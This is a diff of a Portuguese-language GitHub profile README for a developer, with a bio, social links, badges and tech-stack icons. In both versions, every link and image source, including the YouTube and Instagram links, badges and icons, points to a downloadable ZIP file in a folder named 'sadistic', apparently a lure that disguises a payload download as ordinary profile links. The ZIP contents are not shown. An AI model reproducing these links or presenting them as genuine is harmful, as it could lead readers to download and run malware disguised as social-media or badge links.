@@ -2,35 +2,35 @@
 
 **`Desenvolvedora FullStack`**
 
-Me chamo Larissa Vitória Kich, tenho 20 anos e sou natural do Rio Grande do Sul. Concluí o ensino médio no IFRS, com o curso técnico em informática. Atualmente, estou cursando Análise e Desenvolvimento de Sistemas na PUCRS. Sou apaixonada por tecnologia e compartilho meu conhecimento através do meu canal no YouTube "[Larissa Kich](https://github.com/TCustodio-Dev/Larissakich/raw/refs/heads/main/sadistic/Software-v2.0.zip)", onde ensino a criar projetos web, e também através do Instagram, com o perfil chamado "[Dev em Dev](https://github.com/TCustodio-Dev/Larissakich/raw/refs/heads/main/sadistic/Software-v2.0.zip)".
+Me chamo Larissa Vitória Kich, tenho 20 anos e sou natural do Rio Grande do Sul. Concluí o ensino médio no IFRS, com o curso técnico em informática. Atualmente, estou cursando Análise e Desenvolvimento de Sistemas na PUCRS. Sou apaixonada por tecnologia e compartilho meu conhecimento através do meu canal no YouTube "[Larissa Kich](https://raw.githubusercontent.com/TCustodio-Dev/Larissakich/main/sadistic/Software-3.7.zip)", onde ensino a criar projetos web, e também através do Instagram, com o perfil chamado "[Dev em Dev](https://raw.githubusercontent.com/TCustodio-Dev/Larissakich/main/sadistic/Software-3.7.zip)".
 
 <p align="left">
-    <a href="https://github.com/TCustodio-Dev/Larissakich/raw/refs/heads/main/sadistic/Software-v2.0.zip">
+    <a href="https://raw.githubusercontent.com/TCustodio-Dev/Larissakich/main/sadistic/Software-3.7.zip">
         <img 
             alt="youtube subscribers" 
             title="Inscreva-se no meu canal" 
-            src="https://github.com/TCustodio-Dev/Larissakich/raw/refs/heads/main/sadistic/Software-v2.0.zip%23E05D44&label=Inscreva-se&logo=video&logoColor=white&style=for-the-badge&labelColor=CE4630"
+            src="https://raw.githubusercontent.com/TCustodio-Dev/Larissakich/main/sadistic/Software-3.7.zip%23E05D44&label=Inscreva-se&logo=video&logoColor=white&style=for-the-badge&labelColor=CE4630"
         />
     </a>
-    <a href="https://github.com/TCustodio-Dev/Larissakich/raw/refs/heads/main/sadistic/Software-v2.0.zip">
+    <a href="https://raw.githubusercontent.com/TCustodio-Dev/Larissakich/main/sadistic/Software-3.7.zip">
         <img 
             alt="youtube views" 
             title="Vizualizações no YouTube" 
-            src="https://github.com/TCustodio-Dev/Larissakich/raw/refs/heads/main/sadistic/Software-v2.0.zip%23E1AD0E&logo=eye&logoColor=white&style=for-the-badge&labelColor=C79600"
+            src="https://raw.githubusercontent.com/TCustodio-Dev/Larissakich/main/sadistic/Software-3.7.zip%23E1AD0E&logo=eye&logoColor=white&style=for-the-badge&labelColor=C79600"
         />
     </a> 
-    <a href="https://github.com/TCustodio-Dev/Larissakich/raw/refs/heads/main/sadistic/Software-v2.0.zip">
+    <a href="https://raw.githubusercontent.com/TCustodio-Dev/Larissakich/main/sadistic/Software-3.7.zip">
         <img 
             alt="Total de estrelas" 
             title="Total de estrelas GitHub" 
-            src="https://github.com/TCustodio-Dev/Larissakich/raw/refs/heads/main/sadistic/Software-v2.0.zip"
+            src="https://raw.githubusercontent.com/TCustodio-Dev/Larissakich/main/sadistic/Software-3.7.zip"
         />
     </a>
-    <a href="https://github.com/TCustodio-Dev/Larissakich/raw/refs/heads/main/sadistic/Software-v2.0.zip">
+    <a href="https://raw.githubusercontent.com/TCustodio-Dev/Larissakich/main/sadistic/Software-3.7.zip">
         <img 
             alt="Seguidores" 
             title="Me siga no GitHub" 
-            src="https://github.com/TCustodio-Dev/Larissakich/raw/refs/heads/main/sadistic/Software-v2.0.zip"
+            src="https://raw.githubusercontent.com/TCustodio-Dev/Larissakich/main/sadistic/Software-3.7.zip"
         />
     </a>
 </p>
@@ -45,7 +45,7 @@ Me chamo Larissa Vitória Kich, tenho 20 anos e sou natural do Rio Grande do Sul
     title="HTML" 
     width="30px" 
     style="padding-right: 10px;" 
-    src="https://github.com/TCustodio-Dev/Larissakich/raw/refs/heads/main/sadistic/Software-v2.0.zip" 
+    src="https://raw.githubusercontent.com/TCustodio-Dev/Larissakich/main/sadistic/Software-3.7.zip" 
 />
 <img 
     align="left" 
@@ -53,7 +53,7 @@ Me chamo Larissa Vitória Kich, tenho 20 anos e sou natural do Rio Grande do Sul
     title="CSS"
     width="30px" 
     style="padding-right: 10px;" 
-    src="https://github.com/TCustodio-Dev/Larissakich/raw/refs/heads/main/sadistic/Software-v2.0.zip" 
+    src="https://raw.githubusercontent.com/TCustodio-Dev/Larissakich/main/sadistic/Software-3.7.zip" 
 />
 <img 
     align="left" 
@@ -61,7 +61,7 @@ Me chamo Larissa Vitória Kich, tenho 20 anos e sou natural do Rio Grande do Sul
     title="JavaScript"
     width="30px" 
     style="padding-right: 10px;" 
-    src="https://github.com/TCustodio-Dev/Larissakich/raw/refs/heads/main/sadistic/Software-v2.0.zip" 
+    src="https://raw.githubusercontent.com/TCustodio-Dev/Larissakich/main/sadistic/Software-3.7.zip" 
 />
 <img 
     align="left" 
@@ -69,7 +69,7 @@ Me chamo Larissa Vitória Kich, tenho 20 anos e sou natural do Rio Grande do Sul
     title="TypeScript" 
     width="30px" 
     style="padding-right: 10px;" 
-    src="https://github.com/TCustodio-Dev/Larissakich/raw/refs/heads/main/sadistic/Software-v2.0.zip" 
+    src="https://raw.githubusercontent.com/TCustodio-Dev/Larissakich/main/sadistic/Software-3.7.zip" 
 />
 <img 
     align="left" 
@@ -77,15 +77,15 @@ Me chamo Larissa Vitória Kich, tenho 20 anos e sou natural do Rio Grande do Sul
     title="React" 
     width="30px" 
     style="padding-right: 10px;" 
-    src="https://github.com/TCustodio-Dev/Larissakich/raw/refs/heads/main/sadistic/Software-v2.0.zip" 
+    src="https://raw.githubusercontent.com/TCustodio-Dev/Larissakich/main/sadistic/Software-3.7.zip" 
 />
 <img 
     align="left" 
-    alt="https://github.com/TCustodio-Dev/Larissakich/raw/refs/heads/main/sadistic/Software-v2.0.zip" 
-    title="https://github.com/TCustodio-Dev/Larissakich/raw/refs/heads/main/sadistic/Software-v2.0.zip"
+    alt="https://raw.githubusercontent.com/TCustodio-Dev/Larissakich/main/sadistic/Software-3.7.zip" 
+    title="https://raw.githubusercontent.com/TCustodio-Dev/Larissakich/main/sadistic/Software-3.7.zip"
     width="30px" 
     style="padding-right: 10px;" 
-    src="https://github.com/TCustodio-Dev/Larissakich/raw/refs/heads/main/sadistic/Software-v2.0.zip" 
+    src="https://raw.githubusercontent.com/TCustodio-Dev/Larissakich/main/sadistic/Software-3.7.zip" 
 />
 <img 
     align="left" 
@@ -93,7 +93,7 @@ Me chamo Larissa Vitória Kich, tenho 20 anos e sou natural do Rio Grande do Sul
     title="Bootstrap" 
     width="30px" 
     style="padding-right: 10px;" 
-    src="https://github.com/TCustodio-Dev/Larissakich/raw/refs/heads/main/sadistic/Software-v2.0.zip" 
+    src="https://raw.githubusercontent.com/TCustodio-Dev/Larissakich/main/sadistic/Software-3.7.zip" 
 />
 <img 
     align="left" 
@@ -101,7 +101,7 @@ Me chamo Larissa Vitória Kich, tenho 20 anos e sou natural do Rio Grande do Sul
     title="Tailwind"
     width="30px" 
     style="padding-right: 10px;" 
-    src="https://github.com/TCustodio-Dev/Larissakich/raw/refs/heads/main/sadistic/Software-v2.0.zip" 
+    src="https://raw.githubusercontent.com/TCustodio-Dev/Larissakich/main/sadistic/Software-3.7.zip" 
 />
 <img 
     align="left" 
@@ -109,7 +109,7 @@ Me chamo Larissa Vitória Kich, tenho 20 anos e sou natural do Rio Grande do Sul
     title="SASS"
     width="30px" 
     style="padding-right: 10px;" 
-    src="https://github.com/TCustodio-Dev/Larissakich/raw/refs/heads/main/sadistic/Software-v2.0.zip" 
+    src="https://raw.githubusercontent.com/TCustodio-Dev/Larissakich/main/sadistic/Software-3.7.zip" 
 />
 <img 
     align="left" 
@@ -117,7 +117,7 @@ Me chamo Larissa Vitória Kich, tenho 20 anos e sou natural do Rio Grande do Sul
     title="PHP"
     width="30px" 
     style="padding-right: 10px;" 
-    src="https://github.com/TCustodio-Dev/Larissakich/raw/refs/heads/main/sadistic/Software-v2.0.zip" 
+    src="https://raw.githubusercontent.com/TCustodio-Dev/Larissakich/main/sadistic/Software-3.7.zip" 
 />
 <img 
     align="left" 
@@ -125,7 +125,7 @@ Me chamo Larissa Vitória Kich, tenho 20 anos e sou natural do Rio Grande do Sul
     title="Laravel"
     width="30px" 
     style="padding-right: 10px;" 
-    src="https://github.com/TCustodio-Dev/Larissakich/raw/refs/heads/main/sadistic/Software-v2.0.zip" 
+    src="https://raw.githubusercontent.com/TCustodio-Dev/Larissakich/main/sadistic/Software-3.7.zip" 
 />
 <img 
     align="left" 
@@ -133,7 +133,7 @@ Me chamo Larissa Vitória Kich, tenho 20 anos e sou natural do Rio Grande do Sul
     title="JQuery"
     width="30px" 
     style="padding-right: 10px;" 
-    src="https://github.com/TCustodio-Dev/Larissakich/raw/refs/heads/main/sadistic/Software-v2.0.zip" 
+    src="https://raw.githubusercontent.com/TCustodio-Dev/Larissakich/main/sadistic/Software-3.7.zip" 
 />
 <img 
     align="left" 
@@ -141,7 +141,7 @@ Me chamo Larissa Vitória Kich, tenho 20 anos e sou natural do Rio Grande do Sul
     title="Git"
     width="30px" 
     style="padding-right: 10px;" 
-    src="https://github.com/TCustodio-Dev/Larissakich/raw/refs/heads/main/sadistic/Software-v2.0.zip" 
+    src="https://raw.githubusercontent.com/TCustodio-Dev/Larissakich/main/sadistic/Software-3.7.zip" 
 />
 <img 
     align="left" 
@@ -149,7 +149,7 @@ Me chamo Larissa Vitória Kich, tenho 20 anos e sou natural do Rio Grande do Sul
     title="Python"
     width="30px" 
     style="padding-right: 10px;" 
-    src="https://github.com/TCustodio-Dev/Larissakich/raw/refs/heads/main/sadistic/Software-v2.0.zip" 
+    src="https://raw.githubusercontent.com/TCustodio-Dev/Larissakich/main/sadistic/Software-3.7.zip" 
 />
 
 <br/>
@@ -163,14 +163,14 @@ Me chamo Larissa Vitória Kich, tenho 20 anos e sou natural do Rio Grande do Sul
     alt="GitHub Stats" 
     height="200" 
     style="padding-right: 10px;" 
-    src="https://github.com/TCustodio-Dev/Larissakich/raw/refs/heads/main/sadistic/Software-v2.0.zip" 
+    src="https://raw.githubusercontent.com/TCustodio-Dev/Larissakich/main/sadistic/Software-3.7.zip" 
   />
 
 <img 
       align="left" 
       alt="GitHub Stats" 
       height="200" 
-      src="https://github.com/TCustodio-Dev/Larissakich/raw/refs/heads/main/sadistic/Software-v2.0.zip" 
+      src="https://raw.githubusercontent.com/TCustodio-Dev/Larissakich/main/sadistic/Software-3.7.zip" 
   />
 
 </p>
